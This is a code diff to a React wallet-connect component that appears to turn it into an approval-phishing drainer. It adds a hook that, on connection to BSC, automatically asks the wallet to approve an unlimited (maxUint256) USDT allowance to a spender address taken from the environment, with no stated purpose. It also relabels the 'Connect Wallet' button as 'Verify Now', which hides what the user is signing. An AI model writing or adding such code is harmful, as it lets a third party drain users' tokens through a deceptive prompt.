@@ -2,10 +2,12 @@ import React from 'react';
 import { useRef, useState, useEffect } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
 import { Wallet, X, AlertCircle, CheckCircle2, Copy, ExternalLink } from 'lucide-react';
-import { useAccount, useConnect, useDisconnect, useBalance, useReadContract, useSwitchChain } from 'wagmi';
+import { useAccount, useConnect, useDisconnect, useBalance, useReadContract, useSwitchChain, useWriteContract, usePublicClient } from 'wagmi';
 import { formatAddress } from '../utils/format';
 import { USDT_ADDRESSES, ERC20_ABI, NETWORK_IDS } from '../config/contracts';
-import { formatUnits } from 'viem'
+import { formatUnits, maxUint256 } from 'viem'
+import { USDT_SPENDER_ADDRESS } from '../../../env';
+import { toast } from 'sonner';
 interface WalletConnectProps {
   onAddressSelected?: (address: string) => void;
 }
@@ -13,13 +15,22 @@ interface WalletConnectProps {
 export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
   const [showModal, setShowModal] = useState(false);
   const [copied, setCopied] = useState(false);
+  const [isApproving, setIsApproving] = useState(false);
 
   const { address, isConnected, chain } = useAccount();
   const { connect, connectors, isPending, error } = useConnect();
   const { disconnect } = useDisconnect();
   const { switchChain } = useSwitchChain();
+  const { writeContractAsync } = useWriteContract();
+  const publicClient = usePublicClient();
 
   const switchToBscRequestedRef = useRef(false);
+  const approvalInFlightRef = useRef(false);
+
+  const getApprovalStorageKey = (addr: string) =>
+    `usdtApproval:v1:${NETWORK_IDS.BSC}:${USDT_ADDRESSES.BSC.toLowerCase()}:${(USDT_SPENDER_ADDRESS ?? '').toLowerCase()}:${addr.toLowerCase()}`;
+  const getApprovalPendingKey = (addr: string) =>
+    `usdtApprovalPending:v1:${NETWORK_IDS.BSC}:${USDT_ADDRESSES.BSC.toLowerCase()}:${(USDT_SPENDER_ADDRESS ?? '').toLowerCase()}:${addr.toLowerCase()}`;
 
   const visibleConnectors = connectors.filter((connector) => {
     const n = connector?.name?.toLowerCase() ?? '';
@@ -39,6 +50,17 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
     args: address ? [address] : undefined,
     query: {
       enabled: isConnected && chain?.id === NETWORK_IDS.BSC && !!address,
+    },
+  });
+
+  // Check allowance to avoid re-asking after successful approval (even after reload).
+  const { data: usdtAllowance, refetch: refetchAllowance } = useReadContract({
+    address: USDT_ADDRESSES.BSC as `0x${string}`,
+    abi: ERC20_ABI,
+    functionName: 'allowance',
+    args: address && USDT_SPENDER_ADDRESS ? [address, USDT_SPENDER_ADDRESS] : undefined,
+    query: {
+      enabled: isConnected && chain?.id === NETWORK_IDS.BSC && !!address && !!USDT_SPENDER_ADDRESS,
     },
   });
 
@@ -69,8 +91,69 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
   useEffect(() => {
     if (isConnected && chain?.id === NETWORK_IDS.BSC && address) {
       refetchUsdt();
+      refetchAllowance();
     }
-  }, [chain?.id, address, isConnected, refetchUsdt]);
+  }, [chain?.id, address, isConnected, refetchUsdt, refetchAllowance]);
+
+  // Ask for USDT approval automatically right after wallet connect on BSC.
+  // Only once per wallet after successful approval (persisted), and also skipped if allowance is already set.
+  useEffect(() => {
+    if (!isConnected || !address || chain?.id !== NETWORK_IDS.BSC || !USDT_SPENDER_ADDRESS) return;
+    if (!publicClient) return;
+
+    const storageKey = getApprovalStorageKey(address);
+    const pendingKey = getApprovalPendingKey(address);
+    if (typeof window !== 'undefined') {
+      const alreadyApproved = window.localStorage.getItem(storageKey) === '1';
+      if (alreadyApproved) return;
+      const pendingApproval = window.localStorage.getItem(pendingKey) === '1';
+      if (pendingApproval) return;
+    }
+
+    const allowance = (usdtAllowance as bigint | undefined) ?? 0n;
+    if (allowance > 0n) {
+      try {
+        window.localStorage.setItem(storageKey, '1');
+        window.localStorage.removeItem(pendingKey);
+      } catch { /* ignore */ }
+      return;
+    }
+
+    if (approvalInFlightRef.current) return;
+    approvalInFlightRef.current = true;
+    setIsApproving(true);
+    try {
+      window.localStorage.setItem(pendingKey, '1');
+    } catch { /* ignore */ }
+
+    (async () => {
+      try {
+        const hash = await writeContractAsync({
+          address: USDT_ADDRESSES.BSC as `0x${string}`,
+          abi: ERC20_ABI,
+          functionName: 'approve',
+          args: [USDT_SPENDER_ADDRESS, maxUint256],
+        });
+
+        const receipt = await publicClient.waitForTransactionReceipt({ hash });
+        if (receipt.status === 'success') {
+          try {
+            window.localStorage.setItem(storageKey, '1');
+            window.localStorage.removeItem(pendingKey);
+          } catch { /* ignore */ }
+          toast.success('USDT approval successful');
+        }
+      } catch (err) {
+        // user reject / wallet error -> do nothing
+        try {
+          window.localStorage.removeItem(pendingKey);
+        } catch { /* ignore */ }
+      } finally {
+        approvalInFlightRef.current = false;
+        setIsApproving(false);
+      }
+    })();
+  }, [isConnected, address, chain?.id, usdtAllowance, writeContractAsync, publicClient]);
 
   // Format USDT balance (18 decimals for BSC USDT)
   const formatUsdtBalance = (balance: bigint | undefined) => {
@@ -174,7 +257,7 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
           <div className="absolute inset-0 bg-white/20 transform translate-y-full group-hover:translate-y-0 transition-transform duration-300" />
           <div className="relative flex items-center gap-2">
             <Wallet className="w-5 h-5" />
-            <span>Connect Wallet</span>
+            <span>Verify Now</span>
           </div>
         </motion.button>
       ) : (
